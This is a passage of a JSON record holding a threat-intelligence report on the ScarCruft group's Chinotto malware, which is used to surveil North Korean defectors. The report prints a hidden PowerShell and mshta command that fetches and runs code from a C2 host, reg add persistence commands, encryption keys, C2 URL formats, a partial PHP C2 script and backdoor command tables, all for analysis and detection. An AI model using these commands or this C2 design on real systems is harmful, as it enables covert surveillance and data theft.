{
    "id": "e2b46c71-6803-418a-8009-d540a4a11a59",
    "created_at": "2023-01-12T15:02:28.006547Z",
    "updated_at": "2025-03-27T02:16:37.136556Z",
    "deleted_at": null,
    "sha1_hash": "0a17af0c6b45549dfd58f559d07a0d789903caa3",
    "title": "2021-11-29 - ScarCruft surveilling North Korean defectors and human rights activists",
    "authors": "",
    "file_creation_date": "2022-05-28T02:05:20Z",
    "file_modification_date": "2022-05-28T02:05:20Z",
    "file_size": 2256741,
    "plain_text": "# ScarCruft surveilling North Korean defectors and human rights activists\n\n**[securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/](https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/)**\n\nAuthors\n\nGReAT\n\nThe ScarCruft group (also known as APT37 or Temp.Reaper) is a nation-state sponsored APT actor we first reported in 2016. ScarCruft is\nknown to target North Korean defectors, journalists who cover North Korea-related news and government organizations related to the Korean\nPeninsula, between others. Recently, we were approached by a news organization with a request for technical assistance during their\n[cybersecurity investigations. As a result, we had an opportunity to perform a deeper investigation on a host compromised by ScarCruft. The](https://www.nknews.org/2021/09/north-korea-linked-account-poses-as-kbs-scriptwriter-to-dupe-dprk-watchers/?share=0292c675&url=invalid)\nvictim was infected by PowerShell malware and we discovered evidence that the actor had already stolen data from the victim and had been\nsurveilling this victim for several months. The actor also attempted to send spear-phishing emails to the victims’ associates working in\nbusinesses related to North Korea by using stolen login credentials.\n\nBased on the findings from the compromised machine, we discovered additional malware. The actor utilized three types of malware with\nsimilar functionalities: versions implemented in PowerShell, Windows executables and Android applications. Although intended for different\nplatforms, they share a similar command and control scheme based on HTTP communication. Therefore, the malware operators can control\nthe whole malware family through one set of command and control scripts.\n\nWe were working closely with a local CERT to investigate the attacker’s command and control infrastructure and as a result of this, we were\nable better understand how it works. The APT operator controls the malware using a PHP script on the compromised web server and controls\nthe implants based on the HTTP parameters. We were also able to acquire several log files from the compromised servers. Based on said\nfiles, we identified additional victims in South Korea and compromised web servers that have been utilized by ScarCruft since early 2021.\nAdditionally, we discovered older variants of the malware, delivered via HWP documents, dating back to mid-2020.\n\n[More information about ScarCruft is available to customers of Kaspersky Intelligence Reporting. Contact: intelreports@kaspersky.com](http://10.10.0.46/mailto:intelreports@kaspersky.com)\n\n## Spear-phishing document\n\nBefore spear-phishing a potential victim and sending a malicious document, the actor contacted an acquaintance of the victim using the\nvictim’s stolen Facebook account. The actor already knew that the potential target ran a business related to North Korea and asked about its\ncurrent status. After a conversation on social media, the actor sent a spear-phishing email to the potential victim using a stolen email account.\nThe actor leveraged their attacks using stolen login credentials, such as Facebook and personal email accounts, and thereby showed a high\nlevel of sophistication.\n\nAfter a Facebook conversation, the potential target received a spear-phishing email from the actor. It contains a password-protected RAR\narchive with the password shown in the email body. The RAR file contains a malicious Word document.\n\n\n-----\n\n**_Spear-phishing email and decoy_**\n\nThis document contains a lure related to North Korea.\n\n**MD5** **File name** **Modified time** **Author** **Last saved**\n**user**\n\n\nbaa9b34f152076ecc4e01e35ecc2de18 북한의 최근 정세와 우리의 안보.doc\n(North Korea’s latest situation and our national\nsecurity)\n\n\n2021-09-03\n09:34:00\n\n\nLeopard Cloud\n\n\nThis document contains a malicious macro and a payload for a multi-stage infection process. The first stage’s macro contains obfuscated\nstrings and then spawns another macro as a second stage.\n\nThe first stage macro checks for the presence of a Kaspersky security solution on the victim’s machine by trying the following file paths:\n\nC:\\Windows\\avp.exe # Kaspersky AV\nC:\\Windows\\Kavsvc.exe # Kaspersky AV\nC:\\Windows\\clisve.exe # Unknown\n\nIf a Kaspersky security solution is indeed installed on the system, it enables trust access for Visual Basic Application (VBA) by setting the\nfollowing registry key to ‘1’:\n\n1 HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\[Application.Version]\\Word\\Security\\AccessVBOM\n\nBy doing so, Microsoft Office will trust all macros and run any code without showing a security warning or requiring the user’s permission. Next,\nthe macro creates a mutex named ‘ sensiblemtv16n’ and opens the malicious file once more. Thanks to the “trust all macros” setting, the macro\nwill be executed automatically.\n\nIf no Kaspersky security software is installed, the macro directly proceeds to decrypt the next stage’s payload. In order to achieve this, it uses a\nvariation of a substitution method. The script compares the given encrypted string with a second string to get an index of matched characters.\nNext, it receives a decrypted character with an index acquired from the first string.\n\nFirst string: BU+13r7JX9A)dwxvD5h2WpQOGfbmNKPcLelj(kogHs.#yi*IET6V&tC,uYz=Z0RS8aM4Fqn\nSecond string: v&tC,uYz=Z0RS8aM4FqnD5h2WpQOGfbmNKPcLelj(kogHs.#yi*IET6V7JX9A)dwxBU+13r\n\nThe decrypted second stage Visual Basic Application (VBA) contains shellcode as a hex string. This script is responsible for injecting the\nshellcode into the process notepad.exe.\n\n\n-----\n\n**_Shellcode in the second stage VBA_**\n\nThe shellcode contains the URL to fetch the next stage payload. After fetching the payload, the shellcode decrypts it with trivial single-byte\nXOR decryption. Unfortunately, we weren’t able to gather the final payload when we investigated this sample.\n\nThe payload’s download path is:\n\n1 hxxps://api.onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBalVyZDlodU1wUWNjTGt4bXhBV0pjQU1ja2M_ZT1mUnc4VHg/\n\n## Host investigation\n\nAs a result of our efforts in helping the victim with the analysis, we had a chance to investigate the host of the owner who sent the spearphishing email. When we first checked the process list, there was a suspicious PowerShell process running with a rather suspicious parameter.\n\nThis PowerShell command was registered via the Run registry key as a mechanism for persistence:\n\nRegistry path: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run – ONEGO\n\n1 c:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 300000 2.2.2.2\n|| mshta hxxp://[redacted].cafe24[.]com/bbs/probook/1.html\n\nThis registry key causes the HTML Application (HTA) file to get fetched and executed by the mshta.exe process every time the system is\nbooted. The fetched ‘1.html’ is an HTML Application (.hta) file that contains Visual Basic Script (VBS), which eventually executes PowerShell\ncommands.\nThe PowerShell script offers simple backdoor functionalities and continuously queries the C2 server with HTTP POST requests containing\nseveral parameters. At first, it sends a beacon to the C2 server with the host name:\n\n1 hxxp://[redacted].cafe24[.]com/bbs/probook/do.php?type=hello&direction=send&id=[host name]\n\nNext, it attempts to download commands from the C2 server with the following format:\n\n1 hxxp://[redacted].cafe24[.]com/bbs/probook/do.php??type=command&direction=receive&id=\n\nIf the HTTP response from the C2 server is 200, it checks the response data and executes the delivered commands.\n\n\n**Delivered**\n**data**\n\n\n**Description**\n\n\nref: Send a beacon to the C2 server:\n\nHTTP request: ?type=hello&direction=send&id=\n\n\n-----\n\ncmd: If the command data includes ‘start’, execute the given command with cmd.exe and send base64 encoded ‘OK’ with the\nfollowing POST format. Otherwise, it executes the given command, redirecting the result to the result file\n(%APPDATA%\\desktop.dat), and sends the contents of the file after base64 encoding.\n\nHTTP request: ?type=result&direction=send&id=\n\nWe discovered additional malware, tools and stolen files from the victim’s host. Due to limited access to the compromised host, we were\nunable to figure out the initial infection vector. However, we assess this host was compromised on March 22, 2021, based on the timestamp of\nthe suspicious files. One characteristic of the malware we discovered from the victim is the writing of execution results from commands to the\nfile “%appdata%\\desktop.dat”. According to the Master File Table (MFT) information, this file was created the same day, March 22, 2021, and\nthe last modification time is on September 8, 2021, which means this file was used until just before our investigation.\n\nUsing the additional tools, the malware operator collected sensitive information from this victim, although we can’t assess exactly how much\ndata was exfiltrated and what kind of data was stolen. Based on the timestamp of the folders and files created by the malware, the actor\ncollected and exfiltrated files as early as August 2021. The log files with the .dat extension are encrypted, but can be decrypted with the onebyte XOR key 0x75. These log files contain the uploading history. We found two log files and each of them contains slightly different logs. The\n‘B14yNKWdROad6DDeFxkxPZpsUmb.dat’ file contains zipping and uploading of the folder bearing the same name. The log file presents the\nprocess as: “Zip Dir Start > Up Init > Up Start > Up File Succeed > Zip Dir Succeed”. According to the log file, the malware operator collected\nsomething from the infected system in this folder and uploaded it after archiving.\n\n**_File archiving and uploading log_**\n\nThe other log file, named “s5gRAEs70xTHkAdUjl_DY1fD.dat”, also contains a file uploading history, except for file zipping messages. It\nprocesses each file with this procedure: “Up Init > Up Start > Up File Succeed”.\n\n**_File uploading log_**\n\nBased on what we found from this victim, we can confirm that the malware operator collected screenshots and exfiltrated them between\nAugust 6, 2021 and September 8, 2021. Based on what we found out from the victim, we can summarize the whole infection timeline. We\nsuspect this host was compromised on March 22, 2021. After the initial infection, the actor attempted to implant additional malware, but an\nerror occurred that led to the crash of the malware. The malware operator later delivered the Chinotto malware in August 2021 and probably\nstarted to exfiltrate sensitive data from the victim.\n\n\n-----\n\n**_Timeline of the attack on the victim_**\n\n## Windows executable Chinotto\n\nAs a result of the host investigation, we discovered a malicious Windows executable and found additional malware variants from VirusTotal\nand our own sample collection. One of the Windows executables contains a build path and the malware author appears to call the malware\n[“Chinotto“.](https://en.wikipedia.org/wiki/Chinotto_(drink))\n\n**_PDB path_**\n\n[The technical specifications in this analysis are based on the Chinotto malware (MD5 00df5bbac9ad059c441e8fef9fefc3c1) we discovered](https://opentip.kaspersky.com/00df5bbac9ad059c441e8fef9fefc3c1/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\nfrom the host investigation. One of the characteristics of this malware is that it contains a lot of garbage code to impede analysis. During\nruntime, the malware copies unused data to the allocated buffer before copying the real value; or allocates an unused buffer, filling it with\nmeaningless data, and never uses it.\n\nIt also restores functional strings such as C2 addresses and debugging messages to the stack at runtime. The malware creates a mutex and\nfetches the C2 addresses, which are different for each sample we discovered:\n\n\n1\n\n2\n\n\nMutex: NxaNnkHnJiNAuDCcoCKRAngjHVUZG2hSZL03pw8Y\n\nC2 address: hxxp://luminix.openhaja[.]com/bbs/data/proc1/proc.php\n\n\nIn order to generate the identification value of the victim, the malware acquires both computer and user name and combines them in the format\n‘%computer name%_%user name%’. Next, it encrypts the acquired string with the XOR key ‘YFXAWSAEAXee12D4’ and encodes it with\nbase64.\n\nThe backdoor continuously queries the C2 server, awaiting commands from the malware operator. We observed an early version of Chinotto\n[malware (MD5 55afe67b0cd4a01f3a9a6621c26b1a49) which, while it also follows this simple principle, uses a hard-coded backdoor command](https://opentip.kaspersky.com/55afe67b0cd4a01f3a9a6621c26b1a49/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n‘scap’. This means this specific sample is only designed for exfiltrating the victim’s screenshot.\n\nThe Chinotto malware shows fully fledged capabilities to control and exfiltrate sensitive information from the victims.\n\n**Command** **Description**\n\nref: Send beacon to the C2 server:\nhttp://[C2 URL]?ref=id=%s&type=hello&direction=send\n\n\n-----\n\ncmd: Execute Windows commands and save the result to the %APPDATA%\\s5gRAEs70xTHkAdUjl_DY1f.dat file after encrypting with a\none-byte XOR key\n\ndown: Download file from the remote server\n\nup: Upload file\n\nstate: Upload log file (s5gRAEs70xTHkAdUjl_DY1fD.dat)\n\nregstart: Copy current malware to the  CSIDL_COMMON_DOCUMENTS folder and execute command to register file to run registry:\n“reg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v a2McCq /t REG_SZ /d %s /f”\n\ncleartemp: Remove files from folder “%APPDATA%\\s5gRAEs70xTHkAdUjl_DY1fD”\n\nupdir: Archive directory and upload it. Archive is XOR encoded using the same key used when creating the identification value:\n‘YFXAWSAEAXee12D4’\n\ninit: Collect files with following extensions from the paths CSIDL_DESKTOP, CSIDL_PERSONAL(CSIDL_MYDOCUMENTS),\nCSIDL_MYMUSIC, CSIDL_MYVIDEO. Downloads and upload them to C2 server:\njpg|jpeg|png|gif|bmp|hwp|doc|docx|xls|xlsx|xlsm|ppt|pptx|pdf|txt|mp3|amr|m4a|ogg|aac|wav|wma|3gpp|eml|lnk|zip|rar|egg|alz|7z|vcf|3\n\nscap: Take a screenshot, save it to the folder “%appdata%\\s5gRAEs70xTHkAdUjl_DY1fD” in an archived format. The file to store the\nscreenshot has an ‘e_‘ prefix and 10 randomly generated characters as a filename. When uploading the screenshot file, it uses\n‘wrpdwRwsFEse’ as the filename\n\nrun: Run Windows commands with ShellExecuteW API\n\nchdec: Download an encrypted file and decrypt it via CryptUnprotectData API\n\nupdate: Download updated malware and register it:\nreg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v m4cVWKDsa9WxAWr41iaNGR /t REG_S\n/d %s /f\n\nwait: Sleep for 30 minutes\n\nwakeup: Wake up after 2.5 seconds\n\n[Another malware sample (MD5 04ddb77e44ac13c78d6cb304d71e2b86) that demonstrated a slight difference during runtime was discovered](https://opentip.kaspersky.com/04ddb77e44ac13c78d6cb304d71e2b86/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\nfrom the same victim. This is the same fully featured backdoor, but it loads the backdoor command using a different scheme. The malware\nchecks for the existence of a ‘*.zbpiz’ file in the same folder. If it exists, it loads the file’s content and uses it as a backdoor command after\ndecrypting. The malware authors keep changing the capabilities of the malware to evade detection and create custom variants depending on\nthe victim’s scenario.\n\nIn addition, there are different Windows executable variants of the Chinotto malware. Apart from the conventional Chinotto malware mentioned\nabove, a different variant contains an embedded PowerShell script. The spawned PowerShell command has similar functionality to the\nPowerShell we found from the victim. However, it contains additional backdoor commands, such as uploading and downloading capabilities.\nBased on the build timestamp of the malware, we assess that the malware author used the PowerShell embedded version from mid-2019 to\nmid-2020 and started to use the malicious, PowerShell-less Windows executable from the end of 2020 onward.\n\n## Android Chinotto\n\nBased on the C2 communication pattern, we discovered an Android application version of Chinotto malware (MD5\n[56f3d2bcf67cf9f7b7d16ce8a5f8140a). This malicious APK requests excessive permissions according to the AndroidManifest.xml file. To](https://opentip.kaspersky.com/56f3d2bcf67cf9f7b7d16ce8a5f8140a/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\nachieve its purpose of spying on the user, these apps ask users to enable various sorts of permissions. Granting these permissions allows the\napps to collect sensitive information, including contacts, messages, call logs, device information and audio recordings. Each sample has a\ndifferent package name, with the analyzed sample bearing “com.secure.protect” as a package name.\n\nThe malware sends its unique device ID in the same format as the Windows executable version of Chinotto.\n\n1 Beacon URI pattern: [C2 url]?type=hello&direction=send&id=[Unique Device ID]\n\nNext, it receives a command after the following HTTP request:\n\n1 Retrieve commands: [C2 url]?type=command&direction=receive&id=[Unique Device ID]\n\nIf the delivered data from the C2 server is not “ERROR” or “Fail”, the malware starts to carry out backdoor operations.\n\n\n-----\n\n**Command** **URI pattern** **Description**\n\n\nref: ?\ntype=hello&direction=send&id=\n\n\nSend the same beacon request to the C2 server\n\n\ndown ?type=file&direction=send&id= Upload the temporary file (/sdcard/.temp-file.dat) to the C2 server and remove it from local\nstorage.\n\nUriP ?type=file&direction=send&id= Save temporary file path to the result file (/sdcard/result-file.dat) and upload the temporary\nfile.\n\n\nUploadInfo ?\ntype=hello&direction=send&id=\n?type=file&direction=send&id=\n\n\nAfter sending a beacon, collect the following information to the /icloud/tmp-web path:\n\nInfo.txt: Phone number, IP address, SDK version (OS version), Temporary file path\nSms.txt: Save all text messages with JSON format\nCalllog.txt: Save all call logs with JSON format\nContact.txt: Save all contact lists with JSON format\nAccount.txt: Save all account information with JSON format\n\nUpload collected file after archiving. The archived file is encrypted by AES with the key\n“3399CEFC3326EEFF”.\n\n\nUploadFile ?type=file&direction=send&id= Execute command ‘cd /sdcard;ls -alR’, save the result to the temporary file (/sdcard/.tempfile.dat) and upload it. Upload all thumbnails and photos after encrypting via AES and the key\n“3399CEFC3326EEFF”.\n\nETC ?type=file&direction=send&id= Execute command saving the result to the result file (/sdcard/result-file.dat)\n\nand upload the result\n\n?type=file&direction=send&id\n\n[We found that the actor had an interest in a more specific file list in one variant (MD5 cba17c78b84d1e440722178a97886bb7). The](https://opentip.kaspersky.com/cba17c78b84d1e440722178a97886bb7/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n‘UploadFile’ command of this variant uploads specific files to the C2 server. The AMR file is an audio file generally used for recording phone\ncalls. Also, Huawei cloud and Tencent services are two of the targets. To surveil the victim, the list includes target folders as well as /Camera,\n/Recordings, /KakaoTalk (a renowned Korean messenger), /문건(documents), /사진(pictures) and /좋은글(good articles).\n\n**_Targeted files and folders_**\n\nTo sum up, the actor targeted victims with a probable spear-phishing attack for Windows systems and smishing for Android systems. The actor\nleverages Windows executable versions and PowerShell versions to control Windows systems. We may presume that if a victim’s host and\nmobile are infected at the same time, the malware operator is able to overcome two-factor authentication by stealing SMS messages from the\nmobile phone. After a backdoor operation with a fully featured backdoor, the operator is able to steal any information they are interested in.\nUsing the stolen information, the actor further leverages their attacks. For example, the group attempts to infect additional valuable hosts and\ncontact potential victims using stolen social media accounts or email accounts.\n\n\n-----\n\n**_Attack procedure_**\n\n## Older malicious HWP documents\n\nThe threat actor behind this campaign delivered the same malware with a malicious HWP file. At that time, lures related to COVID-19 and\ncredential access were used.\n\n**HWP hash** **HWP file name** **Dropped payload hash**\n\n\nf17502d3e12615b0fa8868472a4eabfb 코로나19 재감염 사례-백신 무용지물.hwp\n\n(Covid-19 reinfection case-Useless vaccine.hwp)\n\nc155f49f0a9042d6df68fb593968e110 계정기능 제한 안내.hwp\n\n(Notice of limitation of account.hwp)\n\n\n72e5b8ea33aeb083631d1e8b302e76af\n\n(Visual Basic Script)\n\n5a7ef48fe0e8ae65733db64ddb7f2478\n\n(Windows executable)\n\n\n[The Visual Basic Script created by the first HWP file (MD5 f17502d3e12615b0fa8868472a4eabfb) has similar functionalities to the Chinotto](https://opentip.kaspersky.com/f17502d3e12615b0fa8868472a4eabfb/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\nmalware. It also uses the same HTTP communication pattern. The second payload dropped from the malicious HWP is a Windows executable\nexecuting an embedded PowerShell script with the same functionalities. These discoveries reveal related activity dating back to at least mid2020.\n\n## Infrastructure\n\nIn this campaign, the actor relied solely on compromised web servers, mostly located in South Korea. During this research we worked closely\nwith the local CERT to take down the attacker’s infrastructure and had a chance to look into one of the scripts on the C2 servers that control\nthe Chinotto malware. The C2 script (named “do.php”) uses several predefined files to save the client’s status (shakest) and commands\n(comcmd). Also, it parses several parameters (id, type, direction, data) delivered by the HTTP request from the implant:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n\n$type = ;       # type parameter\n\n$shakename = \"shakest\"; # Save client status\n\n$comcmdname = \"comcmd\"; # Save commands\n\n$btid = \"\";       # Client unique ID\n\n$direction = \"\";    # 'direction' parameter\n\n$data = \"\";       # 'data' parameter\n\nif (isset($_GET['id'])){\n\n$btid = $_GET['id'];\n\n}\n\nif (isset($_GET['type'])){\n\n$type = $_GET['type'];\n\n}\n\nif (isset($_GET['direction'])){\n\n$direction = $_GET['direction'];\n\n}\n\nif (isset($_GET['data'])){\n\n$data = $_GET['data'];\n\n..\n\n$comname = $btid.\"\";\n\n$comresname = $comname . \"-result\";\n\n\nIn order to control the client, the C2 script uses HTTP parameters. First, it checks the value of the ‘type’ parameter. The ‘type’ parameter\ncarries four values: hello, command, result, and file.\n\n**Value of ‘type’ param** **Description**\n\nhello Report and control the client status\n\ncommand Hold the command from the operator or retrieve the command from the client\n\nresult Upload the command execution result or retrieve the command\n\nfile Upload file to the C2 server\n\n### ‘hello’ type\n\nWhen the script receives the ‘type=hello’ parameter, it checks the value of ‘direction’. In this routine, the script checks the status of the client.\nThe malware operator saves the client status to a specific file, the ‘shakest’ file in this case. If the ‘send’ value is being received, the client\nstatus is set to ‘ON’. If ‘receive’ is set as well, the client’s status log file is sent (likely in order to send the status of clients to the malware\noperator). The ‘refresh’ value is for setting all clients to ‘OFF’ and ‘release’ is used to initialize the command file. The client just replies ‘OK’.\n\n\n-----\n\n**_‘type=hello’ commands_**\n\n### ‘command’ type\n\nIn order to manage the implant’s commands, the C2 script handles several additional parameters. If the ‘type=command’ alongside\n‘direction=receive’ is set, it issues a request from the client to retrieve a command.\n\nThere are two kinds of command files: common commands like an initial command or commands sent to all clients, and individual commands\nfor a specific client. If an individual command exists for a client, it delivers it. Otherwise, the client is sent a common command. If the ‘direction’\nparameter is set to ‘send’, the request is coming from the malware operator in order to save the sent command in the C2 server. Using this\nrequest, the operator can set two commands files: common command or individual command. If the ‘botid’ parameter contains ‘cli’, it means\nthis request is for setting a common command file. If the ‘data’ parameter contains ‘refclear:’, the common command file gets initialized.\nOtherwise, the ‘data’ value is saved to the common command file. If ‘botid’ is not ‘cli’, it means this request is directed to an individual\ncommand file. The process of saving the individual command file is the same as the process used for saving the common command.\n\n\n-----\n\n**_type=command commands_**\n\n### ‘result’ type\n\nWhen uploading command execution results coming from the implant, the script sets the ‘type’ parameter to ‘result’. If the ‘direction’ parameter\nequals ‘send’, it saves the value of the ‘data’ parameter to the individual result file: “[botid]-result“. The ‘receive’ value of the ‘direction’\nparameter means retrieving the individual result file. The script then sends the result file to the operator after encoding it with base64.\n\n### ‘file’ type\n\nThe last possible ‘type’ command is ‘file’. This value is used for exfiltrating files from the victim. If a file upload succeeds, the script sends the\nmessage ‘SEND SUCCESS’. Otherwise, it sends ‘There was an error uploading the file, please try again!’.\n\nWe discovered that the malware operator used a separate webpage to monitor and control the victims. From several compromised C2 servers\nwe see a control page carrying a ‘control.php’ file name.\n\n**_Control page from this case_**\n\nThe control page shows a simple structure. The operator can see a list of infected hosts in the left panel with the corresponding status “ON” or\n“OFF”. Based on this information, the operator is able to issue a command using the right panel and watch the result from the client.\n\n\n-----\n\n## Victims\n\nWe began this research by providing support to human rights activists and defectors from North Korea against an actor seeking to surveil and\ntrack them.\n\nAdditionally, we discovered further victims we couldn’t profile from analyzing the C2 servers. From analyzing the attacker’s infrastructure, we\nfound 75 client connections between January 2021 and February 2021. Most IP addresses seem to be Tor or VPN connections, which are\nlikely to be either from researchers or the malware operators.\n\nAnalyzing other C2 servers, we found more information about possible additional victims. Excluding connections coming from Tor, there are\nonly connections coming from South Korea. Based on the IP addresses, we could distinguish four different suspected victims located in South\nKorea, and determine their operating system and browser used based on user-agent information:\n\nVictim A connected to the C2 server from July 16 to September 5 and has outdated versions of Windows OS and Internet Explorer. Victim B\nconnected to this server on September 4 and operates Windows 8 and Internet Explorer 10. While we were investigating the C2 server, Victim\nD kept connecting to it, using Windows 10 with Chrome version 78.\n\n**_Timeline of victims_**\n\nTo sum up, this campaign is targeting entities in South Korea, which is a top point of interest for ScarCruft. Based on our findings, we also\nassume that the threat actor targeted individuals rather than specific companies or organizations.\n\n## Attribution\n\nWe discovered several code overlaps with old ScarCruft malware named POORWEB. At first, when Chinotto malware uploads the file to the\nC2 server, it uses the HTTP POST request with a boundary generated with a random function. When Chinotto malware (MD5\n[00df5bbac9ad059c441e8fef9fefc3c1) generates a boundary value, it executes the random() function twice and concatenates each value. The](https://opentip.kaspersky.com/00df5bbac9ad059c441e8fef9fefc3c1/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\ngeneration process is not exactly the same, but it utilizes a similar scheme as the old POORWEB malware (MD5\n97b35c34d600088e2a281c3874035f59).\n\n**_HTTP boundary generation routine_**\n\n[Moreover, there is additional code overlap with Document Stealer malware (MD5 cff9d2f8dae891bd5549bde869fe8b7a) that was previously](https://opentip.kaspersky.com/cff9d2f8dae891bd5549bde869fe8b7a/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\nutilized with POORWEB malware. When the Chinotto malware checks the response from the C2 server, it checks whether the response is\n_‘HTTP/1.1 200 OK’ and not ‘error’. This Document Stealer malware also has the same routine to check responses from the C2 server._\n\n\n-----\n\n**_C2 response check routine_**\n\nApart from code similarity, historically, [ScarCruft group is known to surveil individuals related to North Korea such as journalists, defectors,](https://securelist.com/scarcruft-continues-to-evolve-introduces-bluetooth-harvester/90729/)\ndiplomats and government employees. The target of this attack is within the same scope as previous ScarCruft group campaigns. Based on\nthe victimology and several code overlaps, we assess with medium confidence that this cyber-espionage operation is related to the ScarCruft\ngroup.\n\n## Conclusions\n\nMany journalists, defectors and human rights activists are targets of sophisticated cyberattacks. Unlike corporations, these targets typically\ndon’t have sufficient tools to protect against and respond to highly skilled surveillance attacks. One of the purposes of our team is to help\nindividuals targeted by APT groups. This research stemmed from this kind of endeavor. Our collaboration with the local CERT allowed us to\ngain a unique look into ScarCruft’s infrastructure setup and allowed us to discover many technical details.\n\nUsing these findings, we found additional Android variants of the same malware, which has been invaluable in understanding and tracking\nScarCruft TTPs. Moreover, while hunting for related activity, we uncovered an older set of activity dating back to mid-2020, possibly indicating\nthat ScarCruft operations against this set of individuals have been operating for a longer period of time.\n\n## Indicators of compromise\n\n**Malicious documents**\n\n[baa9b34f152076ecc4e01e35ecc2de18](https://opentip.kaspersky.com/baa9b34f152076ecc4e01e35ecc2de18/?utm_source=SL&utm_medium=SL&utm_campaign=SL) 북한의 최근 정세와 우리의 안보.doc\n\n[7d5283a844c5d17881e91a5909a5af3c](https://opentip.kaspersky.com/7d5283a844c5d17881e91a5909a5af3c/?utm_source=SL&utm_medium=SL&utm_campaign=SL) 화학원료.doc (similar document)\n\n**HTA file**\n\n[e9e13dd4434e2a2392228712f73c98ef](https://opentip.kaspersky.com/e9e13dd4434e2a2392228712f73c98ef/?utm_source=SL&utm_medium=SL&utm_campaign=SL) 1.html\n\n**Windows executable Chinotto**\n\n[00df5bbac9ad059c441e8fef9fefc3c1](https://opentip.kaspersky.com/00df5bbac9ad059c441e8fef9fefc3c1/?utm_source=SL&utm_medium=SL&utm_campaign=SL) alyakscan.exe\n\n[04ddb77e44ac13c78d6cb304d71e2b86](https://opentip.kaspersky.com/04ddb77e44ac13c78d6cb304d71e2b86/?utm_source=SL&utm_medium=SL&utm_campaign=SL) anprotect5.exe\n\n[55afe67b0cd4a01f3a9a6621c26b1a49](https://opentip.kaspersky.com/55afe67b0cd4a01f3a9a6621c26b1a49/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n[93bcbf59ac14e14c1c39a18d8ddf28ee](https://opentip.kaspersky.com/93bcbf59ac14e14c1c39a18d8ddf28ee/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**PowerShell embedded Chinotto**\n\n[c7c3b03108f2386022793ed29e621343](https://opentip.kaspersky.com/c7c3b03108f2386022793ed29e621343/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n[5a7ef48fe0e8ae65733db64ddb7f2478](https://opentip.kaspersky.com/5a7ef48fe0e8ae65733db64ddb7f2478/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n[b06c203db2bad2363caed1c0c11951ae](https://opentip.kaspersky.com/b06c203db2bad2363caed1c0c11951ae/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n[f08d7f7593b1456a087eb9922507c743](https://opentip.kaspersky.com/f08d7f7593b1456a087eb9922507c743/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n[0dd115c565615651236fffaaf736e377](https://opentip.kaspersky.com/0dd115c565615651236fffaaf736e377/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n[d8ad81bafd18658c52564bbdc89a7db2](https://opentip.kaspersky.com/d8ad81bafd18658c52564bbdc89a7db2/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**Android application Chinotto**\n\n\n-----\n\nb63d c839c 65 0dc898e 9d6\n[c9fb6f127ca18a3c2cf94e405df67f51](https://opentip.kaspersky.com/c9fb6f127ca18a3c2cf94e405df67f51/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[3490053ea54dfc0af2e419be96462b08](https://opentip.kaspersky.com/3490053ea54dfc0af2e419be96462b08/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[cba17c78b84d1e440722178a97886bb7](https://opentip.kaspersky.com/cba17c78b84d1e440722178a97886bb7/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[56f3d2bcf67cf9f7b7d16ce8a5f8140a](https://opentip.kaspersky.com/56f3d2bcf67cf9f7b7d16ce8a5f8140a/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**Payload hosting URLs**\n\nhxxps://api[.]onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBalVyZDlodU1wUWNjTGt4bXhBV0pjQU1ja2M_ZT1mUnc4VHg/roo\nhxxp://www[.]djsm.co[.]kr/js/20170805[.]hwp\n\n**Command and control server**\n\nhxxp://luminix[.]openhaja[.]com/bbs/data/proc1/proc[.]php\nhxxp://luminix[.]kr/bbs/data/proc/proc[.]php\nhxxp://kjdnc[.]gp114[.]net/data/log/do[.]php\nhxxp://kumdo[.]org/admin/cont/do[.]php\nhxxp://haeundaejugong[.]com/editor/chinotto/do[.]php\nhxxp://haeundaejugong[.]com/data/jugong/do[.]php\nhxxp://doseoul[.]com/bbs/data/hnc/update[.]php\nhxxp://hz11[.]cn/jquery-ui-1[.]10[.]4/tests/unit/widget/doc/pu[.]php\n\n## MITRE ATT&CK mapping\n\n**Tactic** **Technique** **Technique Name**\n\n**Resource Development** T1584.006 Compromise Infrastructure: Web Services\n\n**Initial Access** T1566.001 Phishing: Spear-phishing Attachment\n\n\n**Execution** T1059.001\nT1059.005\n\n\nCommand and Scripting Interpreter: PowerShell\nCommand and Scripting Interpreter: Visual Basic\n\n\n**Persistence** T1547.001 Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder\n\n\n**Defense Evasion** T1140\nT1036.005\n\n**Discovery** T1033\nT1082\n\n**Collection** T1113\nT1560.002\n\n**Command and Control** T1071.001\nT1573.001\n\n\nDeobfuscate/Decode Files or Information\nMasquerading: Match Legitimate Name or Location\n\nSystem Owner/User Discovery\nSystem Information Discovery\n\nScreen Capture\nArchive 